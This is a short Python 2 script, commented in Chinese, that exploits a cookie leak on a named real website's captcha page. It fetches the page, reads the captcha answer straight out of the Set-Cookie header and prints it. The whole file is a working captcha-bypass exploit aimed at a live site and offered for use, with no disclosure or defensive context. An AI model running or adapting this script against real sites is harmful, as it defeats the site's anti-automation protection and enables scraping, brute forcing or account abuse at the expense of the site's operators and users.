#!/usr/bin/python
# -*- coding: utf-8 -*-

# 验证码

#  http://share.shangxueba.com/VerifyCode2.aspx?

'''
通过 cookie 漏洞获取验证码
'''

import urllib2
response = urllib2.urlopen('http://share.shangxueba.com/VerifyCode2.aspx?')
print response.info().getheader("Set-Cookie").split(";")[2].split("=")[1]
response.close()  # best practice to close the file


